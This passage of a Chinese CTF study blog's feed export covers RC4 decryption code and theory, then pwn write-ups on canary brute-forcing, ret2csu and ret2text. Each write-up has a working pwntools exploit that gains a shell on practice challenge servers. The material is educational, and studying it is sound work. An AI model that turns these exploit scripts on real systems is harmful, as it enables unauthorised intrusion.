bin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 安全获取输入 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_input</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* prompt, <span class="type">char</span>* buffer, <span class="type">size_t</span> max_len)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">    <span class="keyword">if</span> (fgets(buffer, (<span class="type">int</span>)max_len, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;  <span class="comment">// 显式转换</span></span><br><span class="line">        buffer[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除换行符</span></span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span> &amp;&amp; buffer[len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        buffer[len - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[MAX_INPUT_LEN];</span><br><span class="line">    <span class="type">char</span> hex_cipher[MAX_INPUT_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== RC4 解密工具 ===\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    get_input(<span class="string">&quot;请输入密钥: &quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line">    get_input(<span class="string">&quot;请输入密文(HEX): &quot;</span>, hex_cipher, <span class="keyword">sizeof</span>(hex_cipher));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证十六进制输入</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; hex_cipher[i]; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isxdigit</span>((<span class="type">unsigned</span> <span class="type">char</span>)hex_cipher[i])) &#123;  <span class="comment">// 显式类型转换</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 无效的十六进制字符 &#x27;%c&#x27;\n&quot;</span>, hex_cipher[i]);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为二进制</span></span><br><span class="line">    <span class="type">size_t</span> cipher_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* ciphertext = hex2bin(hex_cipher, &amp;cipher_len);</span><br><span class="line">    <span class="keyword">if</span> (!ciphertext || cipher_len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 十六进制转换失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配解密缓冲区</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* decrypted = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">calloc</span>(cipher_len + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!decrypted) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 内存分配失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(ciphertext);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密过程</span></span><br><span class="line">    RC4_CTX ctx;</span><br><span class="line">    rc4_init(&amp;ctx, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(&amp;ctx, ciphertext, decrypted, cipher_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保字符串终止</span></span><br><span class="line">    decrypted[cipher_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n解密结果:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密钥: %s\n&quot;</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文(HEX): %s\n&quot;</span>, hex_cipher);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密文本: %s\n&quot;</span>, decrypted);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理内存</span></span><br><span class="line">    <span class="built_in">free</span>(ciphertext);</span><br><span class="line">    <span class="built_in">free</span>(decrypted);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n按 Enter 键退出...&quot;</span>);</span><br><span class="line">    getchar();  <span class="comment">// 忽略返回值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里来详细了解一下标准rc4</p>
<p><strong>算法概述</strong>：RC4（Rivest Cipher 4）是由Ron Rivest在1987年设计的流密码算法，被广泛应用于SSL&#x2F;TLS、WEP等协议中。它是一种对称</p>
<p>加密算法，使用相同的密钥进行加密和解密。</p>
<p><strong>核心组件</strong>：</p>
<ol>
<li>S盒（State Box）</li>
</ol>
<ul>
<li>256字节的数组（0-255）</li>
<li>初始化为顺序值：<code>S[0]=0, S[1]=1, ..., S[255]=255</code></li>
</ul>
<ol start="2">
<li>密钥调度算法（KSA）</li>
</ol>
<ul>
<li>使用密钥初始化S盒</li>
<li>伪代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">255</span>:</span><br><span class="line">    j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">    swap(S[i], S[j])</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>伪随机生成算法（PRGA）</li>
</ol>
<ul>
<li>生成密钥流字节</li>
<li>伪代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">swap(S[i], S[j])</span><br><span class="line">K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line"><span class="keyword">return</span> K</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><h3 id="加密-解密过程"><a href="#加密-解密过程" class="headerlink" title="加密&#x2F;解密过程"></a>加密&#x2F;解密过程</h3><ul>
<li>明文&#x2F;密文与密钥流字节异或</li>
<li><code>ciphertext_byte = plaintext_byte XOR K</code></li>
<li><code>plaintext_byte = ciphertext_byte XOR K</code></li>
</ul>
</li>
</ol>
<h3 id="详细加密流程"><a href="#详细加密流程" class="headerlink" title="详细加密流程"></a>详细加密流程</h3><ol>
<li>步骤1: 密钥调度（KSA）</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(RC4_CTX *ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">size_t</span> key_len)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 初始化S盒</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        ctx-&gt;S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重置索引</span></span><br><span class="line">    ctx-&gt;i = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;j = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用密钥打乱S盒</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + ctx-&gt;S[i] + key[i % key_len]) % <span class="number">256</span>;</span><br><span class="line">        <span class="comment">// 交换S[i]和S[j]</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = ctx-&gt;S[i];</span><br><span class="line">        ctx-&gt;S[i] = ctx-&gt;S[j];</span><br><span class="line">        ctx-&gt;S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>KSA简而言之就是先初始化S盒在用key打乱S盒。</p>
<ol start="2">
<li>步骤2: 生成密钥流字节(PRGA)</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">rc4_generate_byte</span><span class="params">(RC4_CTX *ctx)</span> &#123;</span><br><span class="line">    <span class="comment">// 更新索引</span></span><br><span class="line">    ctx-&gt;i = (ctx-&gt;i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    ctx-&gt;j = (ctx-&gt;j + ctx-&gt;S[ctx-&gt;i]) % <span class="number">256</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 交换S[i]和S[j]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp = ctx-&gt;S[ctx-&gt;i];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;i] = ctx-&gt;S[ctx-&gt;j];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;j] = temp;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算密钥流字节</span></span><br><span class="line">    <span class="keyword">return</span> ctx-&gt;S[(ctx-&gt;S[ctx-&gt;i] + ctx-&gt;S[ctx-&gt;j]) % <span class="number">256</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PRGA简而言之生成密钥流</p>
<ol start="3">
<li>步骤3: 加密数据</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(RC4_CTX *ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *input, </span></span><br><span class="line"><span class="params">               <span class="type">unsigned</span> <span class="type">char</span> *output, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> n = <span class="number">0</span>; n &lt; len; n++) &#123;</span><br><span class="line">        <span class="comment">// 生成密钥流字节并与输入字节异或</span></span><br><span class="line">        output[n] = input[n] ^ rc4_generate_byte(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：我可以发现只要得到秘钥流就可以通过密文和秘钥流异或得到明文，当然这个用的时候得保证这个异或没有被魔改。</p>
]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
        <category>rc4学习</category>
      </categories>
  </entry>
  <entry>
    <title>pwn54(模拟canary)</title>
    <url>/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/</url>
    <content><![CDATA[<ol>
<li><p>先用IDA打开发现有canary函数</p>
<p><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/1.png" alt="1"></p>
</li>
<li><p>为什么要比较呢；应为如果我们利用栈溢出改了s1的部分，到了比较的部分就会退出程序。<br><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/2.png" alt="2"></p>
</li>
</ol>
<p>​       可以看到我们可以利用这个判断爆破出canary,找到canary后利用栈溢出执行flag函数就可以了<br>​       <code>python ​       from pwn import * ​       from LibcSearcher import * ​       #context.log_level = &#39;debug&#39; ​       #context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;) ​       canary=b&#39;&#39; ​       for i in range(4): ​           for j in range(0x1000): ​               r=remote(&quot;pwn.challenge.ctf.show&quot;, 28145) ​               flag=0x08048696 ​               r.sendlineafter(&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;,&#39;999&#39;) ​               r.recv() ​        ​               payload1=b&quot;I&quot;*(0x20)+canary+p8(j)#+b&quot;a&quot;*16+p32(flag)#+p32(0)+p32(876)+p32(877)#+p32(system) ​               r.send(payload1) ​                       a=r.recv()                if b&#39;Canary Value Incorrect!&#39; not in a: #不输出这个字符串代表该字符匹配成功                    canary+=p8(j) #将匹配字节加入到后面（canary j  的顺序）                    print(canary)                    break                else:                    print(&quot;gg&quot;)                r.close()        r = remote(&quot;pwn.challenge.ctf.show&quot;,28145)        flag=0x08048696        r.sendlineafter(&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;,&#39;999&#39;)        print(canary)        payload1=b&quot;I&quot;*(0x20)+canary+b&quot;a&quot;*16+p32(flag)        r.recvuntil(&quot;$&quot;)        r.send(payload1)        r.recv()        r.interactive()       </code></p>
<p><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/3.png" alt="3"></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>ret2csu</title>
    <url>/2025/08/04/ret2csu/</url>
    <content><![CDATA[<p>原理学习：</p>
<p>什么时候用？</p>
<p>找不到简单指令（如 <code>pop rdi; ret</code>, <code>pop rsi; ret</code>, <code>pop rdx; ret</code>）的情况下。</p>
<p>所以我们看到_libc_csu_init这个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401250 __libc_csu_init proc near               ; DATA XREF: _start+1A↑o</span><br><span class="line">.text:0000000000401250 ; __unwind &#123;</span><br><span class="line">.text:0000000000401250                 endbr64</span><br><span class="line">.text:0000000000401254                 push    r15</span><br><span class="line">.text:0000000000401256                 lea     r15, __frame_dummy_init_array_entry</span><br><span class="line">.text:000000000040125D                 push    r14</span><br><span class="line">.text:000000000040125F                 mov     r14, rdx   </span><br><span class="line">.text:0000000000401262                 push    r13</span><br><span class="line">.text:0000000000401264                 mov     r13, rsi  </span><br><span class="line">.text:0000000000401267                 push    r12</span><br><span class="line">.text:0000000000401269                 mov     r12d, edi   </span><br><span class="line">.text:000000000040126C                 push    rbp</span><br><span class="line">.text:000000000040126D                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000401274                 push    rbx</span><br><span class="line">.text:0000000000401275                 sub     rbp, r15</span><br><span class="line">.text:0000000000401278                 sub     rsp, 8</span><br><span class="line">.text:000000000040127C                 call    _init_proc</span><br><span class="line">.text:0000000000401281                 sar     rbp, 3</span><br><span class="line">.text:0000000000401285                 jz      short loc_4012A6</span><br><span class="line">.text:0000000000401287                 xor     ebx, ebx</span><br><span class="line">.text:0000000000401289                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000401290</span><br><span class="line">.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000401290                 mov     rdx, r14 //rdx = r14</span><br><span class="line">.text:0000000000401293                 mov     rsi, r13 //rsi = r13</span><br><span class="line">.text:0000000000401296                 mov     edi, r12d //edi = r12d</span><br><span class="line">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:000000000040129D                 add     rbx, 1</span><br><span class="line">.text:00000000004012A1                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004012A4                 jnz     short loc_401290</span><br><span class="line">.text:00000000004012A6</span><br><span class="line">.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:00000000004012A6                 add     rsp, 8</span><br><span class="line">.text:00000000004012AA                 pop     rbx</span><br><span class="line">.text:00000000004012AB                 pop     rbp</span><br><span class="line">.text:00000000004012AC                 pop     r12</span><br><span class="line">.text:00000000004012AE                 pop     r13</span><br><span class="line">.text:00000000004012B0                 pop     r14</span><br><span class="line">.text:00000000004012B2                 pop     r15</span><br><span class="line">.text:00000000004012B4                 retn</span><br><span class="line">.text:00000000004012B4 ; &#125; // starts at 401250</span><br><span class="line">.text:00000000004012B4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<p>可以看到rdx &#x3D; r14，rsi &#x3D; r13，edi &#x3D; r12d，可以看到rdx,rsi,edi可以通过r14， r13，r12d来控制，从而我们就可以解决这些指令缺少的问</p>
<p>题。</p>
<p>具体讲一下怎么利用的：</p>
<p>当执行__libc_csu_init(.text:0000000000401285                 jz      short loc_4012A6)是先执行loc_4012A6:，再loc_401290: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:00000000004012A6                 add     rsp, 8</span><br><span class="line">.text:00000000004012AA                 pop     rbx</span><br><span class="line">.text:00000000004012AB                 pop     rbp</span><br><span class="line">.text:00000000004012AC                 pop     r12</span><br><span class="line">.text:00000000004012AE                 pop     r13</span><br><span class="line">.text:00000000004012B0                 pop     r14</span><br><span class="line">.text:00000000004012B2                 pop     r15</span><br><span class="line">.text:00000000004012B4                 retn</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000401290                 mov     rdx, r14 //rdx = r14</span><br><span class="line">.text:0000000000401293                 mov     rsi, r13 //rsi = r13</span><br><span class="line">.text:0000000000401296                 mov     edi, r12d //edi = r12d</span><br><span class="line">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:000000000040129D                 add     rbx, 1</span><br><span class="line">.text:00000000004012A1                 cmp     rbp, rbx  //比较rbp, rbx</span><br><span class="line">.text:00000000004012A4                 jnz     short loc_401290 //判断为假跳到401290</span><br></pre></td></tr></table></figure>

<p>我们要他继续往下执行所以我们要是其为真，因此rbp, rbx得相等，我们先设置rbp &#x3D; 1，rbx &#x3D; 0；执行到add     rbx, 1 –&gt; rbx &#x3D; 1,正好达</p>
<p>到rbp &#x3D; rbx，r14设置成原本要在rdx要的参数，r13和r12也同理。</p>
<p>注释：由于高32位基本为0 ，所以  rdi &#x3D; edi &#x3D; r12d。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br></pre></td></tr></table></figure>

<p>我们只要把r15设置成我们需要执行的function，就可以 call function   。(r15+rbx * 8 &#x3D; r15+0 * 8 &#x3D; r15)</p>
<p>题目</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Start Your Exploit!\n&quot;</span>, <span class="number">0x14u</span>LL);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Ok.\n&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>开启NX不能直接注入shellcode</p>
<p>这里找不到<code>pop rdi; ret</code>, <code>pop rsi; ret</code>, <code>pop rdx; ret</code>但是有__libc_csu_init</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004012ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004012ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004012b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004012b2 : pop r15 ; ret</span><br><span class="line">0x00000000004012ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004012af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004012b3 : pop rdi ; ret</span><br><span class="line">0x00000000004012b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004012ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">0x00000000004011ba : ret 0xfffe</span><br></pre></td></tr></table></figure>



<p>我们可以利用栈溢出构造ROP链进行攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">26879</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./1&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2csu&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_got=<span class="number">0x404018</span></span><br><span class="line">write_plt=<span class="number">0x401064</span></span><br><span class="line">csu_start=<span class="number">0x0000000000401290</span></span><br><span class="line">csu_end=<span class="number">0x000000004012AA</span></span><br><span class="line">main=<span class="number">0x0000000004011DC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r15,r13,r14,r12,ret_addr</span>):</span><br><span class="line">    pay=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(csu_end)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pay+=p64(csu_start)</span><br><span class="line">    pay+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(ret_addr)   //<span class="number">56</span>填充的是loc_4012A6的<span class="number">7</span>个pop|ret的地址。</span><br><span class="line">    io.sendline(pay)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,write_got,<span class="number">8</span>,<span class="number">1</span>,main)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Ok.\n&quot;</span>)</span><br><span class="line">write_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;write_addr==&gt;<span class="subst">&#123;<span class="built_in">hex</span>(write_addr)&#125;</span>&quot;</span>)</span><br><span class="line">base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi = <span class="number">0x00000000004012b3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span> </span><br><span class="line">pay=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(ret)+p64(rdi)+p64(bin_sh_addr)+p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>ret2csu</category>
      </categories>
  </entry>
  <entry>
    <title>ret2syscall</title>
    <url>/2025/03/02/ret2syscall/</url>
    <content><![CDATA[<h2 id="PWN中栈溢出的部分简单题型"><a href="#PWN中栈溢出的部分简单题型" class="headerlink" title="PWN中栈溢出的部分简单题型"></a>PWN中栈溢出的部分简单题型</h2><h3 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h3><p>这类题型里：</p>
<p>1、存在能够覆盖返回地址的栈溢出</p>
<p>2、程序代码中直接存在类似于**system(“bin&#x2F;sh”)**能够直接获取程序控制权的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这段代码向系统申请一个sh的用户shell，可以获得当前交互主机的控制权bash</span><br></pre></td></tr></table></figure>



<p>造成栈溢出的最常见的情形：</p>
<p>1、gets()，由于gets()函数不限制读入的长度，所以一般看到程序中出现了gets()读取用户输入的情况，大概率是存在栈溢出的。</p>
<p>2、限制长度读入函数，规定读入的长度大于变量与rbp&#x2F;ebp之间的距离，例如下图：</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_16-53-33.png" alt="Clip_2024-12-04_16-53-33"></p>
<p>虽然read(0,buf,0x32uLL)限制了向buf内读入的长度为0x32，但是buf与rbp之间的距离只有0xA，就存在0x32-0xA&#x3D;0x28的长度是可以溢出的。</p>
<h4 id="例题1："><a href="#例题1：" class="headerlink" title="例题1："></a>例题1：</h4><p>CTFshow - pwn38</p>
<p>64位ret2text</p>
<p>pwn基本解题流程：</p>
<p>1、checksec检查程序基本信息：</p>
<p>2、为程序添加可执行权：</p>
<p>chmod +x pwn</p>
<p>3、IDA反编译分析程序结构。</p>
<p>4、gdb动态分析、调试。</p>
<p>5、编写攻击脚本exp。</p>
<p>checksec查看程序基本信息：</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-38-43.png" alt="Clip_2024-12-04_17-38-43"></p>
<p>IDA反编译分析：</p>
<p>主函数：</p>
<p>存在0x32-0xA &#x3D; 0x28长度的栈溢出。</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-02-34.png" alt="Clip_2024-12-04_17-02-34"></p>
<p>后门函数：</p>
<p>存在system(“&#x2F;bin&#x2F;sh”)</p>
<p><img src="/2025/03/02/ret2syscall/image-20240514131905819.png" alt="image-20240514131905819"></p>
<img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-10-38.png" alt="Clip_2024-12-04_17-10-38" style="zoom:50%;">

<p>gdb调试：</p>
<p>在这道题中：</p>
<p>0x7fffffffdc00是buf的起始地址，大小为0xA，rbp是buf+0xA 也就是图中的0x7fffffffdc10，而紧跟着rbp后面的就是函数的返回地址，ret address，我们只需要通过栈溢出将ret address改写成我们想要让程序返回的地方即可达到攻击的目的。</p>
<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-15-39.png" alt="Clip_2024-12-04_17-15-39"></p>
<p>编写攻击脚本exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)<span class="comment">#与远程建立连接。</span></span><br><span class="line"></span><br><span class="line">io.recv()<span class="comment">#接收程序的输出</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400287</span> <span class="comment">#ROPgadget --binary pwn --only &quot;ret&quot;，用于寻找程序中的ret指令的地址。</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0xA</span>+<span class="number">8</span>) +p64(ret)+ p64(<span class="number">0x400657</span>)</span><br><span class="line"><span class="comment">#用（0xA+8）长度的垃圾数据&#x27;A&#x27;来填充距离，再接上p64(ret)进行堆栈平衡,最后接上后门函数的地址。</span></span><br><span class="line">io.sendline(payload)<span class="comment">#发送构造的payload</span></span><br><span class="line">io.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>



<h4 id="例题2："><a href="#例题2：" class="headerlink" title="例题2："></a>例题2：</h4><p>CTFshow——pwn37</p>
